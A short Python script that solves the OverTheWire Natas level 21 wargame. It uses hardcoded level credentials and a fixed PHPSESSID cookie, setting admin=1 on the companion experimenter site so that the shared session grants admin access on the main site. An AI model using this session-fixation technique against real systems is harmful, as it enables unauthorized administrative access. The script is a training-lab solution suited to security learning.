import requests

URL = "http://natas21.natas.labs.overthewire.org/"
URL_EXPERIMENT = "http://natas21-experimenter.natas.labs.overthewire.org/index.php?admin=1&submit=1"
CREDS = ("natas21", "IFekPyrQXftziDEsUr3x21sYuahypdgJ")
PHPSESSID = "PHPSESSID"

s = requests.Session()
s.auth = CREDS

cookie = {PHPSESSID: "123"}

s.get(URL_EXPERIMENT, cookies=cookie)
print(s.get(URL, cookies=cookie).text)
